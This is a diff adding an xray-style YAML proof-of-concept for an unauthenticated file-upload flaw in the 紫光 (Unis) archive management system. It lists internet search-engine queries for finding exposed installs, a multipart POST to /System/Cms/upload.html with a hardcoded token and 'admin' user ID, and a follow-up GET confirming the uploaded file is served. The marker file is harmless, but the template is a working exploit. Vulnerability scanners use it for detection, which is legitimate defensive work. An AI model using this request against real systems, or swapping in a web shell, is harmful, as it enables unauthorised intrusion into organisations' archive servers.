@@ -1,0 +1,72 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="紫光档案管理系统"
+    hunter-query: app.name="紫光档案管理系统"
+    quake-query: app:"紫光档案管理系统登录入口"
+    zoomeye-query: iconhash:"3e2ee25dc73811fe2a697deefe447017"
+    threatbook-query: icon
+    cve: 
+    cnvd: 
+    
+name: poc-yaml-ziguang-dianzi-manage-upload
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /System/Cms/upload.html?token=5117e82385cef4c12547fdd4c028b97a1-1
+      follow_redirects: false
+      headers:
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygIRYWNxmDYiZBguT
+      body: |
+        ------WebKitFormBoundarygIRYWNxmDYiZBguT
+        Content-Disposition: form-data; name="userID"
+
+        admin
+        ------WebKitFormBoundarygIRYWNxmDYiZBguT
+        Content-Disposition: form-data; name="fondsid"
+
+        1
+        ------WebKitFormBoundarygIRYWNxmDYiZBguT
+        Content-Disposition: form-data; name="comid"
+ 
+        1
+        ------WebKitFormBoundarygIRYWNxmDYiZBguT
+        Content-Disposition: form-data; name="token"
+
+        6b79a77180e9ec3a7ca351ebe54641a2
+        ------WebKitFormBoundarygIRYWNxmDYiZBguT
+        Content-Disposition: form-data; name="files[]"; filename="xray.txt"
+        Content-Type: text/php
+
+        xray
+        ------WebKitFormBoundarygIRYWNxmDYiZBguT--
+    expression: >-
+      response.status == 200 && response.body_string.contains("xray.txt")
+
+    output:
+      search: |-
+        "(?P<data>2[\\d]{7})".bsubmatch(response.body)
+      data: search["data"]
+      search1: |-
+        "(?P<filename>UNIS.*?txt)".bsubmatch(response.body)
+      filename: search1["filename"]
+  r1:
+    request:
+      method: GET
+      path: /uploads/company1/fonds1/cms/{{data}}/{{filename}}
+    expression: >-
+      response.body_string.contains("xray")
+
+expression: r0() && r1()
+
